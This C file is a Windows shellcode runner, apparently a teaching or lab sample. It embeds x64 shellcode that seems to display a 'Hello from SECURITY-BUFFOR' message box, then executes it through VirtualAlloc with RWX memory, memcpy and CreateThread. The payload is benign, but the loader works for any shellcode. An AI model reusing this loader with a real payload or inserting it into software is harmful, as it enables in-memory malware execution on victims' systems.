#include <windows.h>
#include <stdio.h>

// x64 shellcode
unsigned char buf[] =
        "\xfc\x48\x81\xe4\xf0\xff\xff\xff\xe8\xd0\x00\x00\x00\x41"
        "\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60"
        "\x3e\x48\x8b\x52\x18\x3e\x48\x8b\x52\x20\x3e\x48\x8b\x72"
        "\x50\x3e\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac"
        "\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2"
        "\xed\x52\x41\x51\x3e\x48\x8b\x52\x20\x3e\x8b\x42\x3c\x48"
        "\x01\xd0\x3e\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x6f"
        "\x48\x01\xd0\x50\x3e\x8b\x48\x18\x3e\x44\x8b\x40\x20\x49"
        "\x01\xd0\xe3\x5c\x48\xff\xc9\x3e\x41\x8b\x34\x88\x48\x01"
        "\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01"
        "\xc1\x38\xe0\x75\xf1\x3e\x4c\x03\x4c\x24\x08\x45\x39\xd1"
        "\x75\xd6\x58\x3e\x44\x8b\x40\x24\x49\x01\xd0\x66\x3e\x41"
        "\x8b\x0c\x48\x3e\x44\x8b\x40\x1c\x49\x01\xd0\x3e\x41\x8b"
        "\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58"
        "\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41"
        "\x59\x5a\x3e\x48\x8b\x12\xe9\x49\xff\xff\xff\x5d\x3e\x48"
        "\x8d\x8d\x31\x01\x00\x00\x41\xba\x4c\x77\x26\x07\xff\xd5"
        "\x49\xc7\xc1\x00\x00\x00\x00\x3e\x48\x8d\x95\x0e\x01\x00"
        "\x00\x3e\x4c\x8d\x85\x29\x01\x00\x00\x48\x31\xc9\x41\xba"
        "\x45\x83\x56\x07\xff\xd5\x48\x31\xc9\x41\xba\xf0\xb5\xa2"
        "\x56\xff\xd5\x48\x65\x6c\x6c\x6f\x20\x66\x72\x6f\x6d\x20"
        "\x53\x45\x43\x55\x52\x49\x54\x59\x2d\x42\x55\x46\x46\x4f"
        "\x52\x00\x53\x75\x63\x63\x65\x73\x73\x00\x75\x73\x65\x72"
        "\x33\x32\x2e\x64\x6c\x6c\x00";
unsigned int buf_len = 329;



int main(void) {
    void* buf_mem; // pointer to memory buffer for payload
    HANDLE hthread;

    // Allocate a memory buffer for payload with permission RWX
    buf_mem = VirtualAlloc(0, buf_len, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

    // copy payload to allocated buffer
    memcpy(buf_mem, buf, buf_len);

    // run shellcode
    hthread = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)buf_mem, 0, 0, 0);
    if (hthread != NULL) {
        WaitForSingleObject(hthread, 500);
        CloseHandle(hthread);
        return 0;
    }


    return 0;
}